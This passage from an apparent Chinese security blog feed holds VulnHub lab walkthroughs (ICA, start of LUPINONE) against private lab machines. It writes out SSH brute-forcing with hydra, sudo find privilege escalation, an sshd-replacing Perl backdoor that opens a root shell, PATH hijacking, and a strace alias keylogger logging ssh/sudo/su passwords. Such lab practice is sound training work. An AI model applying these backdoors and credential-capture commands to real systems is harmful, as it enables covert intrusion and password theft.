&lt;h3 id=&#34;ftp-匿名登陆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名登陆&#34;&gt;#&lt;/a&gt; FTP 匿名登陆&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用用户ftp和空密码登陆到ftp查看有没有敏感文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ftp 192.168.31.229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir &amp;amp;&amp;amp; get note.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-255.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到提示是 pwnlab 是该服务器的某一个用户，并且密码比较简单&lt;/p&gt;
&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
&lt;p&gt;80 网站信息收集，是个默认的 apache 界面&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-256.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.229&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-257.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -u http://192.168.31.229/ -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-253.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; gobuster 扫描后并没有什么发现&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 SSH&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;hydra 爆破可疑用户 pwdlab 的密码登陆ssh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.31.229 -f -t 4 -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-259.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 账户：pwnlab 密码：babygirl1&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登陆服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh pwnlab@192.168.31.229&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;收集服务器信息：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /etc/issue &amp;amp;&amp;amp; uname -a &amp;amp;&amp;amp; sudo -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;sudofind提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudofind提权&#34;&gt;#&lt;/a&gt; sudo (find) 提权&lt;/h3&gt;
&lt;p&gt;发现可以直接通过无密码调用 root 权限的 find&lt;br&gt;
 寻找提权命令：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZmluZC8=&#34;&gt;https://gtfobins.github.io/gtfobins/find/&lt;/span&gt;&lt;br&gt;
 &lt;code&gt;sudo find. -exec /bin/sh \; -quit&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-260.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 直接提升成了 root 账户&lt;/p&gt;
&lt;h3 id=&#34;ssh-wrapper维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-wrapper维权&#34;&gt;#&lt;/a&gt; SSH wrapper 维权&lt;/h3&gt;
&lt;p&gt;参考地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ieXBhc3MwMDcuZ2l0aHViLmlvL0VtZXJnZW5jeS1SZXNwb25zZS1Ob3Rlcy9wcml2aWxlZ2Uv&#34;&gt;https://bypass007.github.io/Emergency-Response-Notes/privilege/&lt;/span&gt;&lt;br&gt;
 从 sshd fork 出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;靶机上依次执行一下命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd /usr/sbin/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv sshd ../bin/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;#!/usr/bin/perl&amp;#x27; &amp;gt;sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;exec &amp;quot;/bin/sh&amp;quot; if(getpeername(STDIN) =~ /^..4A/);&amp;#x27; &amp;gt;&amp;gt;sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;#x27;exec&amp;#123;&amp;quot;/usr/bin/sshd&amp;quot;&amp;#125; &amp;quot;/usr/sbin/sshd&amp;quot;,@ARGV,&amp;#x27; &amp;gt;&amp;gt;sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod u+x sshd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/etc/init.d/sshd restart&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Service ssh restart&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-261.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;攻击机执行以下命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;socat STDIO TCP4:192.168.31.229:22,sourceport=13377&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-262.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; ssh wrapper 权限维持成功，可免密登陆 root 账户&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/114%20ICA/</id>
        <title>VULNHUB 14 ICA</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/114%20ICA/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWNhLTEsNzQ4Lw==&#34;&gt;https://www.vulnhub.com/entry/ica-1,748/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgzMDY0NS9hcnRpY2xlL2RldGFpbHMvMTIzNTIwMTE4&#34;&gt;https://blog.csdn.net/weixin_44830645/article/details/123520118&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 ICA：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-290.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.50&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.50 -oN /tmp/ica.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-291.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 80, 8080&lt;/p&gt;
&lt;h3 id=&#34;qdpm92-漏洞寻找&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#qdpm92-漏洞寻找&#34;&gt;#&lt;/a&gt; qdpm9.2 漏洞寻找&lt;/h3&gt;
&lt;p&gt;1 ）打开网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTA=&#34;&gt;http://192.168.31.50&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-292.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现版本号 qdpm9.2 直接搜索 exp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-293.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在 exploit-db 上找到了可以利用的 poc&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-294.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTAvY29yZS9jb25maWcvZGF0YWJhc2VzLnltbA==&#34;&gt;http://192.168.31.50/core/config/databases.yml&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-295.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到数据库用户名：qdpmadmin 密码：UcVQCMQk2STVeS6J&lt;/p&gt;
&lt;h3 id=&#34;mysql-寻找敏感信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mysql-寻找敏感信息&#34;&gt;#&lt;/a&gt; mysql 寻找敏感信息&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;mysql -h 192.168.31.50 -u qdpmadmin - p&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-296.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;可以用 Navicat 进入数据库&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-297.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以登陆到服务器之后对这些表进行查看&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-298.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到一些 base64 加密后的密码以及一些用户名&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破密码&#34;&gt;#&lt;/a&gt; hydra 爆破密码&lt;/h3&gt;
&lt;p&gt;将用户名和解密后的密码加载到本地&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-299.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用hydra破解:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P pass.txt ssh://192.168.31.50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-300.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-301.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;寻找是否有可利用的 s 权限的文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-302.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;篡改环境变量提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#篡改环境变量提权&#34;&gt;#&lt;/a&gt; 篡改环境变量提权&lt;/h3&gt;
&lt;p&gt;strings 命令用于查看二进制文件中可打印的字符&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-303.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现 /opt/get_access 会执行 cat 命令&lt;br&gt;
因此可以伪造 cat 命令，修改环境变量，使 get_access 执行一个伪造的 cat&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;export PATH=/tmp:$PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo ‘/bin/bash’ &amp;gt; /tmp/cat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Chmod +x /tmp/cat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/opt/get_access&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-304.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;strace-后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#strace-后门&#34;&gt;#&lt;/a&gt; strace 后门&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看是否存在其他的strace监控键盘记录，有的话通过&lt;span class=&#34;built_in&#34;&gt;kill&lt;/span&gt; - 9 &lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;删掉&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias | grep ssh &amp;amp;&amp;amp; ps -ef | grep strace&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; ~/.bashrc &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias ssh=&amp;#x27;strace -f -e trace=read,write -o /tmp/.ssh-`date +%d%h%m%s`.log -s 32 ssh&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias sudo=&amp;#x27;strace -f -e trace=read,write -o /tmp/.sudo-`date &amp;#x27;+%d%h%m%s&amp;#x27;`.log -s 32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alias su=&amp;#x27;strace -f -e trace=read,write -o /tmp/.su-`date &amp;#x27;+%d%h%m%s&amp;#x27;`.log -s 32 su&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;运行环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;source ~/.bashrc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-305.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听/tmp文件下新增的.ssh文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;watch -n1 ls -Alh /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;找出此阶段内登陆到此服务器的密码的记录,无论正确与否都会被监听&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /tmp/.ssh-09May051652090355.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-306.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; strace 后门监控键盘有失败的时候，原因未知&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/116%20LUPINONE/</id>
        <title>VULNHUB 16 LUPINONE</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/116%20LUPINONE/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWx1cGlub25lLDc1MC8=&#34;&gt;https://www.vulnhub.com/entry/empire-lupinone,750/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDAzMTg0L2FydGljbGUvZGV0YWlscy8xMjI3NjY0ODM=&#34;&gt;https://blog.csdn.net/qq_45403184/article/details/122766483&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 LUPINONE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-331.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.236&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.236&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-332.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTM2&#34;&gt;http://192.168.31.136&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-333.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是一个没有任何可以点击的单纯的页面，并且审查源代码没有任何提示&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.236 -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-334.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫描到了 robots.txt 这个文件&lt;/p&gt;
